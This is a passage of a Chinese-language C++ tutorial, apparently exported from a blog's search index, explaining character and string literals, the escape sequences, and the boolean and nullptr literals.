class="keyword">char16_t</span> c3 = <span class="string">u&#x27;A&#x27;</span>;                 <span class="comment">//Unicode16字符型常量</span></span><br><span class="line"><span class="keyword">char32_t</span> c4 = <span class="string">U&#x27;A&#x27;</span>;                 <span class="comment">//Unicode32字符型常量</span></span><br><span class="line"><span class="keyword">char</span> *s1 = <span class="string">&quot;AAAAA&quot;</span>;                 <span class="comment">//const char [6]类型的常量数组</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> s2[] = <span class="string">u8&quot;AAAAA&quot;</span>;<span class="comment">//utf-8字符串字面值常量</span></span><br></pre></td></tr></table></figure><p>clang 生成语法树如下：<br><img src="char_literal_1.jpeg"></p><hr><h1 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h1><p>有两类字符程序员不可以直接使用：一类是<strong>不可打印</strong>字符，如退格回车等控制字符；另一类是 C++ 中有特殊含义的字符（<strong>单引号</strong> <code>&#39;</code>、<strong>双引号</strong> <code>&quot;</code>、<strong>问号</strong> <code>?</code>、<strong>反斜杠</strong> <code>\</code>）。在这些情况下需要用到转义序列，转移序列均以<strong>反斜杠</strong>作为开始。C++ 中规定的转义序列包括有：</p><ul><li>换行符&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\n</code></li><li>纵向制表符&emsp;&emsp;&emsp;&emsp;<code>\v</code></li><li>反斜杠&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\\</code></li><li>回车符&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\r</code></li><li>横向制表符&emsp;&emsp;&emsp;&emsp;<code>\t</code></li><li>退格符&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\b</code></li><li>问号&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\?</code></li><li>进纸符&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\f</code></li><li>报警符&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\a</code></li><li>双引号&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\&quot;</code></li><li>单引号&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<code>\&#39;</code></li></ul><hr><h1 id="布尔字面值和指针字面值"><a href="#布尔字面值和指针字面值" class="headerlink" title="布尔字面值和指针字面值"></a>布尔字面值和指针字面值</h1><p><strong>true</strong> 和 <strong>false</strong> 是布尔类型的字面值<br><strong>nullptr</strong> 是指针字面值</p><hr><blockquote><p>参考资料： 《C++ Prime》、clang 官方文档</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
